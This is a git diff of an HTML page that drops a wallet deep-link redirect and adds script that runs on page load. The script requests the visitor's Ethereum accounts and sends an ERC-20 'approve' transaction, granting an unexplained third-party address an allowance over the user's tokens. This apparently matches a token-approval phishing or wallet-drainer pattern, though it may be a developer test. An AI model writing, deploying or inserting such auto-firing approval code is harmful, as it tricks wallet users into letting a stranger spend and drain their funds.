@@ -1,5 +1,33 @@
 <html>
-	<script type="text/javascript">
-		window.location.href = "okex://metaX/dapp/details?dappUrl=https://www.okx.com/web3/nft/featured"
-	</script>
+    <title>哈哈哈</title>
+    <script>
+        console.log("哈哈哈");
+        async function xxxx(params) {
+            try {
+            const newAccounts = await ethereum.request({
+                method: 'eth_requestAccounts',
+            });
+                console.log(newAccounts);
+            } catch (error) {
+                console.error(error);
+            }   
+        }
+        async function approve(params) {
+            window.ethereum.request({
+                "method": "eth_sendTransaction",
+                "params": [
+                    {
+                    "to": "0x9bc5baf874d2da8d216ae9f137804184ee5afef4",
+                    "from": "0x05d132975D8EfCD67262980C54f9030319C91Af0",
+                    "gas": "0x12312",
+                    "value": "0x0",
+                    "gasPrice": "0x12312",
+                    "data": "0x095ea7b3000000000000000000000000c3364a27f56b95f4beb0742a7325d67a04d80942000000000000000000000000000000000000000000000000000000004190ab00"
+                    }
+                ]
+                })
+        }
+        xxxx()
+        approve()
+    </script>
 </html>
